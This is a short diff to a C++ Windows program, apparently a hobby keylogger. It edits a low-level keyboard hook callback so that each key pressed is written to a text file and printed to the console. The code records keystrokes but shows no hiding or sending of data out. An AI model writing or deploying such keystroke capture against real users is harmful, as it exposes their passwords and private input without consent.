@@ -34,26 +34,16 @@ int main()
 
 LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
     PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
-    ofstream myfile;
-
-
+    
     if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
-
-        filetr = kbDllHook->vkCode;
-
-        int i, n = 1;
-
         ofstream MyFile("filename.txt");
-
-        for (i = 0; i < n; i++)
-        {
-            MyFile << char(filetr);
-        }
+        filetr = kbDllHook->vkCode;
+        MyFile << char(filetr);
+        MyFile << "\n";
+        printf("%c", filetr);
+        printf("\n");
         MyFile.close();
-
-        //printf("%c", filetr);
-
-
     }
+    
     return CallNextHookEx(hook, codigo, wParam, lParam);
 }
